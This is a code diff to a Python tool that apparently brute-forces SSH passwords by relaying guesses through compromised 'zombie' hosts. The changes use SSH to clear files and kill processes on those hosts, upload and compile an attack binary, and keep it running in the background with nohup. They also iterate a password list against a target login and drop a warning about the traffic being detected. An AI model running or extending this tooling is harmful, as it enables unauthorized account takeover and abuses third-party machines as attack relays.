@@ -51,14 +51,15 @@ def awaken_zombies(zombie_list):
             ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             ssh.connect(zmb_host, 22, zmb_user, zmb_pwd)
             # clean
-            ssh.exec_command("a=($(ls -a |grep '\.'|awk '{if(length($0)==33) {print ./$0}}')) && \
-                for i in \"${a[@]}\";do rm -rf \"$i\";done; mkdir -p " + remote_path)
-            ssh.exec_command("a=($(/usr/bin/ss -l|grep %d|awk '{print $5}'|awk -F: '{print $2}')) && \
-                for i in \"${a[@]}\";do kill -9 \"$i\";done;" %zombie_port)
+            ssh.exec_command("a=($(ls -a /tmp|grep '\.'|awk '{if(length($0)==33) {print $0}}')) && \
+                for i in \"${a[@]}\";do rm -rf /tmp/\"$i\";done; mkdir -p " + remote_path)
+            ssh.exec_command("a=($(netstat -ntlp|grep %s|awk '{print $7}'|awk -F/ '{print $1}')) && \
+                for i in \"${a[@]}\";do kill -9 \"$i\";done" %zombie_port)
             # mv
+            time.sleep(1) # wait commands above execute done, otherwise may occure socket error: '[Errno 2] No such file'.
             zombie_scp(ssh, local_file, remote_path + local_file)
-            # compile
-            ssh.exec_command("cd %s; gcc %s -lpthread -lssh -o %s ; chmod +x %s;./%s " %(remote_path, zombie_code, elf_name, elf_name, elf_name) )
+            # compile, 为啥要nohup并重定向，因为实际测试中发现如果不加，随着扫描的进行，被控端上的进程会挂掉。
+            ssh.exec_command("cd %s; gcc %s -lpthread -lssh -o %s ; chmod +x %s; nohup ./%s >nohup.log 2>&1 &" %(remote_path, zombie_code, elf_name, elf_name, elf_name) )
             # run
             stdin, stdout, stderr = ssh.exec_command("/usr/bin/ss -l|grep %d|echo \"anything ok!\"" %zombie_port)
             result=stdout.read().decode()
@@ -108,6 +109,7 @@ def conduct_zombie(target_link, user, password, zombie, release):
         
     except Exception as e:
         print ("\n\033[1;33m[Wrn]\033[0m Zombie-host(%s) connection failed! %s" %(zmb_host,str(e)))
+        sock.close()
         pass
     finally:
         time.sleep(random.uniform(waitime, waitime * 2))
@@ -134,12 +136,10 @@ def precheck_connect_policy(options, zombie_available):
         if(options.conn_num):
             conn_num = int(options.conn_num)
             print ("...threads-number=%d ; available-zombies=%d ; thread_dealy=(%d,%d)." %(conn_num,zombie_available,waitime,2*waitime))
-            if zombie_available == 1 and conn_num >= 10:
-                print ("\033[1;33m[Wrn]\033[0m Dangerous!! The results might be unpredictable.\n")
-            elif zombie_available >= 10 and conn_num > zombie_available:
+            if zombie_available < conn_num :
                 print ("\033[1;33m[Wrn]\033[0m Set threads-number=%d , due to resource limit.\n" %(zombie_available))
                 conn_num = zombie_available
-        print("\033[1;33m[Wrn]\033[0m Watch out! Too much connection request may be detected and reach the limit of service.\n")
+        print("\033[1;33m[Wrn]\033[0m Watch out! Too much connection request may reach the limit of service.\n")
     except Exception as e:
         print ("\033[1;31m[Err]\033[0m Check and run again."+str(e))
         exit(1)
@@ -195,7 +195,7 @@ def main():
     print ("[+] Fire in few seconds. Please wait......")
     time.sleep(2)
     fp = open(passwd_file,'r')
-    count = 0
+    count = 1
     for password in fp.readlines():
         if Found == True:
             print ("\rAbout %.2f%% done ... Already %d attempts." %(count*100/float(passwd_total),count))
@@ -208,6 +208,7 @@ def main():
         password = password.strip('\r').strip('\n')
         
         conn_lock.acquire()
+        print(zombie)
         t = Thread(target = conduct_zombie, args = (target_link, user, password, zombie, True))
         child = t.start()
     if Found == False:
